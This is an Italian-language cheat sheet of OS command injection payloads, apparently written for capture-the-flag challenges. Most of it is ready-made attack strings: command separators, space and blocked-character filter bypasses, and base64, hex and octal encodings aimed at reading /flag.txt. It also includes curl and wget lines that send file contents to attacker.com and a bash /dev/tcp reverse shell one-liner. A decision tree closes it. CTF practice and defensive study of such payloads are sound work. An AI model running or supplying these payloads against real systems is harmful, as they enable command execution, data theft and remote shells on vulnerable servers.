# Command Injection — OS Command Exploitation

Tecniche per iniettare comandi OS quando l'input viene passato a shell.

---

## 🔴 Quando Usare

- Parametro passato a `system()`, `exec()`, `popen()`, backticks
- URL con parametri che sembrano filename o comandi
- Errori che mostrano output bash/shell

---

## 1. Separatori di Comando Base

```bash
# Punto e virgola - esegue entrambi
; cat /flag.txt

# Pipe - passa output
| cat /flag.txt

# AND - esegue secondo se primo OK
&& cat /flag.txt

# OR - esegue secondo se primo fallisce
|| cat /flag.txt

# Newline
%0acat /flag.txt

# Backgrounding
& cat /flag.txt &
```

---

## 2. Sostituzione di Comando

```bash
# Backticks
`cat /flag.txt`

# $() - preferito
$(cat /flag.txt)

# Nested
$(cat $(find / -name flag* 2>/dev/null))
```

---

## 3. Bypass Spazi

Quando lo spazio è filtrato.

```bash
# $IFS (Internal Field Separator)
cat${IFS}/flag.txt
cat$IFS/flag.txt

# Tab (%09)
cat%09/flag.txt

# Brace expansion
{cat,/flag.txt}

# < input redirection
cat</flag.txt
```

---

## 4. Bypass Caratteri Bloccati

```bash
# Slash bloccato - usa variabili
cat ${HOME%%u*}flag.txt

# Usa env
printenv | grep -i flag

# Senza slash
cd .. && cd .. && cat flag.txt
```

---

## 5. Encoding Bypass

```bash
# URL encoding
%63%61%74%20%2f%66%6c%61%67  # cat /flag

# Base64
echo Y2F0IC9mbGFn | base64 -d | bash

# Hex
echo 636174202f666c6167 | xxd -r -p | bash

# Octal
$'\143\141\164' $'\057\146\154\141\147'
```

---

## 6. Wildcard Exploitation

```bash
# Asterisco
cat /fla*
cat /f?ag.txt

# Globbing
cat /[f]lag.txt
cat /{f,F}lag*
```

---

## 7. Alternative a Comandi Comuni

```bash
# cat alternatives
tac /flag.txt
head /flag.txt
tail /flag.txt
more /flag.txt
less /flag.txt
nl /flag.txt
xxd /flag.txt
base64 /flag.txt

# Se cat è bloccato
$(echo cat) /flag.txt
/bin/?at /flag.txt
```

---

## 8. Blind Injection (No Output)

```bash
# Time-based
; sleep 5
| sleep 5

# DNS exfiltration
; curl http://attacker.com/$(cat /flag.txt | base64)
; wget http://attacker.com/?f=$(cat /flag.txt)

# File write
; cat /flag.txt > /var/www/html/out.txt
```

---

## 9. Payloads Pronti

```bash
# Leggi flag - universale
;cat /flag*
|cat /flag.txt
`cat /flag.txt`
$(cat /flag.txt)

# Con bypass spazi
;cat${IFS}/flag.txt
|{cat,/flag.txt}

# Senza caratteri speciali visibili
%3bcat%20%2fflag.txt

# Reverse shell
;bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

---

## 🎯 Decision Tree

1. **Comando semplice funziona?** → Usa `;cat /flag`
2. **Spazi bloccati?** → `${IFS}` o `{cat,/flag}`
3. **Caratteri bloccati?** → URL encoding
4. **No output?** → DNS/HTTP exfil o time-based
5. **Cat bloccato?** → `tac`, `head`, `base64`
